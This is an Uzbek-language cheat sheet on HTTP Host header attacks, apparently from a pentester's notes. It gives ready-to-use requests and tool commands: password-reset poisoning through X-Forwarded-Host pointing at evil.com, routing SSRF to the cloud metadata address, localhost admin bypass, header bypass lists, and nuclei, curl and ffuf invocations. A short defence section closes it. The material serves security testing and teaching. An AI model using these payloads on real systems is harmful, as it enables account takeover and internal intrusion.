# HTTP Host Header Attacks

> Lab yechimlari (PortSwigger'ning 7 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Har HTTP so'rovda `Host` header bor (qaysi saytga murojaat qilyapsan). Ko'p ilova shu header'ga
(yoki `X-Forwarded-Host`ga) **ko'r-ko'rona ishonib**, undan absolute URL/link quradi (masalan
parol reset linki) yoki so'rovni qaysi ichki serverga yo'naltirishni hal qiladi. Sen shu header'ni
nazorat qilgani uchun — reset linkini o'z domeningga buzasan, cache'ni poison qilasan, yoki
serverni ichki manzilga yo'naltirasan (routing SSRF).

**Ildiz sabab:** `Host` — bu foydalanuvchi boshqaradigan input, lekin ilova uni "ishonchli,
o'zimniki" deb hisoblaydi. Reset linkini, email'ni, cache key'ni yoki routing'ni shu ishonchsiz
qiymat asosida quradi.

## Turlari
- **Password reset poisoning** — reset link domeni Host'dan olinadi → qurbon token senga keladi (ATO).
- **Web cache poisoning via Host** — ambiguous/dublikat Host → cache'ga zararli javob.
- **Routing-based SSRF** — Host back-end routing'ni belgilaydi → ichki `/admin`ga yetasan.
- **Host validation bypass** — absolute URL in request line, dublikat Host, port injection, connection-state.
- **Authentication bypass** — `Host: localhost` bilan "ichki/local" deb ko'rinib `/admin`ga kirish.

## Oqibatlar (IMPACT)
- **Parol reset link o'g'irlash → ATO** (eng ko'p uchraydigan yakun).
- Web cache poisoning (`16_WEB_CACHE_POISONING`).
- Routing-based SSRF → ichki admin / cloud; auth bypass.
> Reset poisoning ATO'ga chiqsa **High/Critical**.

## Qayerdan qidiriladi
Parol reset email, absolute link yasaydigan joylar, redirect, ko'p domenli (vhost) server.

## Aniqlash
```http
# Host'ni o'zgartir
GET / HTTP/1.1
Host: evil.com
→ javobda evil.com aks etdimi?

# Override header'lar
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
Forwarded: host=evil.com

# Dubl Host / absolute
Host: target.com
Host: evil.com
```

## Exploit — parol reset poisoning (eng muhim)
```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com
→ victim emailiga https://evil.com/reset?token=... keladi
→ victim bossa, token sening serveringga tushadi → ATO
```

## Boshqa ssenariylar
```http
# Routing SSRF
GET / HTTP/1.1
Host: 169.254.169.254

# Auth bypass (ichki panel)
GET /admin HTTP/1.1
Host: localhost
```

## Bypass variantlari
```
X-Forwarded-Host, X-Forwarded-Server, X-Host, Forwarded, X-Original-URL,
dubl Host, absolute-URI + Host, Host:port, line-wrapping (oldida probel)
```

## TOOLLAR

### Burp Param Miner — Host variantlarini topish
```
Burp extension → "Guess headers" → Host-ga oid override header'larni avtomat sinaydi
```
> Qaysi `X-Forwarded-*` header javobga ta'sir qilishini o'zi topadi.

### nuclei — host header shablon
```bash
nuclei -l live_hosts.txt -t ~/nuclei-templates/http/misconfiguration/ -tags host-header
```
> Ommaviy ravishda host header injection teshigini tekshiradi.

### curl — reset poisoning qo'lda sinash
```bash
curl -s -X POST https://target.com/forgot-password -H "X-Forwarded-Host: evil.com" -d "email=you@test.com"
```
> O'z test emailingga kelgan link domeni `evil.com` bo'lsa — poisoning tasdiqlandi.

### ffuf — vhost brute (yashirin ichki sayt)
```bash
ffuf -w vhosts.txt -u https://TARGET_IP/ -H "Host: FUZZ.target.com" -fs 0
```
> Bitta IP ortidagi yashirin ichki saytlarni (dev, staging) Host header orqali topadi.

## PoC
Reset so'rovida Host'ni o'z serveringga qo'yib, test emailga kelgan link domeni
sening domening bo'lishini va token tushishini ko'rsat.

## Himoya
`Host`ga ishonma, absolute URL'ni config domenidan qur, front-end'da Host allowlist,
`X-Forwarded-Host` ni ishlatma/validate qil.
